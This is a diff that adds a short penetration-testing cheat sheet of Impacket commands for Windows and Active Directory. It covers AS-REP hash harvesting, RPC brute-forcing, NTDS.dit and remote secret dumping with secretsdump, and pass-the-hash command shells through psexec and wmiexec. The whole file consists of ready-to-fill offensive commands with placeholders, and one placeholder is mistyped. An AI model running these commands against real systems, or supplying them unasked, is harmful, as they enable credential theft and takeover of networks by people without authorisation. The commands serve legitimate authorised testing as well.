@@ -1,0 +1,33 @@
+% active-directory
+
+# Get user hash
+impacket-GetNPUsers -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
+
+% rpc
+
+# RPC info
+rpcmap.py 'ncacn_ip_tcp:<ip>'
+
+# RPC bruteforce
+rpcmap.py 'ncacn_ip_tcp:<ip>' -brute-uuids -brute-opnums -auth-level 1 -opnum-max 5
+
+% hash, ntds, active-directory
+
+# Show info of ntds file
+secretsdump.py -pwd-last-set -user-status -history -ntds <ntds.dit> -security SECURITY -system SYSTEM local
+
+# Get ntds.dit secrets
+secretsdump.py -hashes <ntlmhash>:<ntlmhash> '<user>'@<target>
+
+% registry
+
+# Query Windows registry from linux
+reg.py -hashes <hash< <domain>/<user> query -keyName HKU\\
+
+% connection, cmd
+
+# ps cmd console remote connection
+psexec.py -hashes <ntlmhash>:<ntlmhash> <user>@<target> cmd
+
+# wmi cmd console remote connection
+wmiexec.py -hashes <ntlmhash>:<ntlmhash> <user>@<target> cmd
